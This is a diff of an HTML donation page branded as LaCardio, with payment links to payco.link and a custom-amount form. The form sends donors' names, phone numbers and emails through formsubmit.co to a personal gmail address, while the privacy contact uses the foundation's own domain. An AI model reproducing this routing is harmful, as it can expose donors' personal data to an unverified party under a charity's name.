@@ -1,45 +1,67 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="description" content="Página de donaciones">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; base-uri 'self'; object-src 'none'; frame-ancestors 'none'; form-action https://formsubmit.co 'self'; img-src 'self' data:; style-src 'self'; script-src 'self'; connect-src 'self'; font-src 'self'; media-src 'self'; upgrade-insecure-requests;">
 <title>Donaciones</title>
 <link rel="stylesheet" href="style.css">
 </head>
 <body>
-<main>
-  <header><img src="logo-lacardio.png" alt="LaCardio" class="logo"></header>
-  <section class="donation">
-    <h1>Elige tu donación</h1>
-    <div class="amounts">
-      <a class="amount" href="https://payco.link/2e53f9aa-002d-45ab-bf7f-49b0e532f657">$100.000</a>
-      <a class="amount" href="https://payco.link/dddd540d-b4a9-4cae-ae59-f6ff1cbba48a">$200.000</a>
-      <a class="amount" href="https://payco.link/77b79046-d79f-436d-939f-afde96bc4530">$500.000</a>
-      <a class="amount" href="https://payco.link/46e1ea15-837c-44e6-8a6f-f3bbc108cf5a">$1.000.000</a>
-      <a class="amount" href="https://payco.link/fc3b271f-458d-4646-bc97-5b63ae4b4e8b">$2.000.000</a>
-      <a class="amount" href="https://payco.link/7f6a25ff-ac64-4de4-9701-8a40c921d4d9">$4.000.000</a>
-      <button class="amount other" id="customAmount" type="button">Otro monto</button>
-    </div>
-  </section>
+<main class="page">
+<header class="header">
+<img src="logo-lacardio.png" alt="LaCardio" class="logo" width="190" height="70">
+</header>
+
+<section class="donation-section">
+<h1>Elige tu donación</h1>
+<div class="heart-line" aria-hidden="true"><span></span><b>♥</b><span></span></div>
+
+<div class="amounts">
+<a class="amount blue" href="https://payco.link/2e53f9aa-002d-45ab-bf7f-49b0e532f657" rel="noopener noreferrer"><span>$100.000</span><i>→</i></a>
+<a class="amount light-blue" href="https://payco.link/dddd540d-b4a9-4cae-ae59-f6ff1cbba48a" rel="noopener noreferrer"><span>$200.000</span><i>→</i></a>
+<a class="amount red" href="https://payco.link/77b79046-d79f-436d-939f-afde96bc4530" rel="noopener noreferrer"><span>$500.000</span><i>→</i></a>
+<a class="amount blue" href="https://payco.link/46e1ea15-837c-44e6-8a6f-f3bbc108cf5a" rel="noopener noreferrer"><span>$1.000.000</span><i>→</i></a>
+<a class="amount light-blue" href="https://payco.link/fc3b271f-458d-4646-bc97-5b63ae4b4e8b" rel="noopener noreferrer"><span>$2.000.000</span><i>→</i></a>
+<a class="amount red" href="https://payco.link/7f6a25ff-ac64-4de4-9701-8a40c921d4d9" rel="noopener noreferrer"><span>$4.000.000</span><i>→</i></a>
+</div>
+
+<button class="other-amount" id="openModal" type="button"><span>✎</span>Otro monto<i>→</i></button>
+</section>
+
+<!-- NIÑO PEQUEÑO ANIMADO -->
+<section class="child-area" aria-hidden="true">
+<div class="child">
+<div class="head"><div class="hair"></div><div class="eye eye-left"></div><div class="eye eye-right"></div><div class="smile"></div></div>
+<div class="body"><div class="shirt"></div><div class="arm arm-left"></div><div class="arm arm-right"></div></div>
+<div class="leg leg-left"></div><div class="leg leg-right"></div>
+<div class="ball"></div>
+</div>
+</section>
+
+<footer>© 2026 LaCardio. Todos los derechos reservados.</footer>
 </main>
 
-<div class="modal hidden" id="customModal">
-  <div class="card">
-    <button class="close" id="closeModal" type="button">×</button>
-    <h2>Otro monto</h2>
-    <form action="https://formsubmit.co/caudofun@gmail.com" method="POST">
-      <input type="hidden" name="_subject" value="Solicitud de enlace de pago">
-      <input type="hidden" name="_captcha" value="false">
-      <input type="text" name="nombre" placeholder="Nombre completo" required>
-      <input type="tel" name="celular" placeholder="Celular" required>
-      <input type="email" name="correo" placeholder="Correo electrónico" required>
-      <input type="text" name="valor" placeholder="Valor a donar" required>
-      <label><input type="checkbox" name="autorizacion" required>Acepto el tratamiento de mis datos.</label>
-      <button class="send" type="submit">Enviar</button>
-    </form>
-    <small>habeasdata@fundacioncardioinfantil.com.co</small>
-  </div>
+<div class="modal hidden" id="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+<div class="modal-card">
+<button class="close" id="closeModal" type="button" aria-label="Cerrar">×</button>
+<h2 id="modalTitle">Otro monto</h2>
+<form action="https://formsubmit.co/caudofun@gmail.com" method="POST">
+<input type="hidden" name="_subject" value="Solicitud de enlace de pago">
+<input type="hidden" name="_captcha" value="false">
+<input type="text" name="nombre" placeholder="Nombre completo" maxlength="100" required>
+<input type="tel" name="celular" placeholder="Celular" maxlength="30" required>
+<input type="email" name="correo" placeholder="Correo electrónico" maxlength="150" required>
+<input type="text" name="valor" placeholder="Valor a donar" maxlength="20" required>
+<label class="consent"><input type="checkbox" name="autorizacion" required><span>Acepto el tratamiento de mis datos.</span></label>
+<button class="send" type="submit">Enviar</button>
+</form>
+<small>habeasdata@fundacioncardioinfantil.com.co</small>
 </div>
-<script src="script.js"></script>
+</div>
+
+<script src="script.js" defer></script>
 </body>
 </html>
